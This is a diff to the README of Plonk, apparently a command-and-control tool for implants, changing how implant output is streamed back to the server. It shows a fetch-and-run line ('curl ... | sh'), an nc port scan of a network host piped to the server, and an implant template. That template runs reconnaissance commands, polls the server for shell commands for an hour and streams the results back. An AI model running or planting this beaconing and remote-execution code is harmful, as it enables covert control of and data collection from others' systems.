@@ -51,10 +51,11 @@ curl -s https://example.com/t/kittens | sh  # Runs ps awwwfux
 
 Output (`/o`)
 -------------
-Output is sent back as the body of a request to `/o/<ID>`.  It is logged and
-printed to any user which has that ID selected with `,seti`.  By default, only
-1MB of output will be accepted.  Larger amounts of data may be sent via
-[`/p`](#exfil-p).
+Output is sent back as the body of a request to `/o/<ID>` which may either be a
+short request with one chunk of output or a long-lived requst to stream output.
+Output is logged and printed to any user which has that ID selected with
+`,seti`.  By default, only 1MB of output will be accepted.  Larger amounts of
+data may be sent via [`/p`](#exfil-p).
 
 It's not necessary to have a [`/c`-generated](#implant-generation-c) implant
 running.  Anything may be sent to `/o` with any ID, using Plonk as a sort of
@@ -87,10 +88,7 @@ _slaacd  55365  0.0  0.0  1128    24 ??  IpU    Sat01AM    0:00.00 `-- slaacd: f
 Send cheesy portscanner output to Plonk using OpenBSD's
 [`nc(1)`](https://man.openbsd.org/nc.1) as open ports are found:
 ```sh
-nc -zw1 100.100.100.2 1-65535 2>&1 | # Hope you get RSTs back...
-while read -r l; do
-        echo "$l" | curl --data-binary @- http://127.0.0.1:8080/o/portscan
-done &
+nc -zw1 100.100.100.2 1-65535 2>&1 | curl -T. http://127.0.0.1:8080/o/portscan
 ```
 
 #### Client:
@@ -189,16 +187,14 @@ If there is no `implant.tmpl`, the built-in
 
 #### Example
 This template runs a few commands for situational awareness then beacons back
-to Plonk every two seconds for an hour.
+to Plonk every two seconds for an hour with a single, persistent output
+connection.
 ```sh
 export PLONK_ID="{{ .RandN }}-$(hostname)-$$"
 (
         echo 'ps awwwfux || ps auxwww; uname -a; id; pwd'
         curl -sw '\n' --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
-        PLONK_DONE=!$PLONK_DONE
-) | sh | while ! $PLONK_DONE; do
-        timeout 2s cat | curl -T. -s -m 10 "{{ .URL }}/o/$PLONK_ID"
-done
+) | sh 2>&1 | curl -vsT. "{{ .URL }}/o/$PLONK_ID"
 ```
 
 Exfil (`/p`)
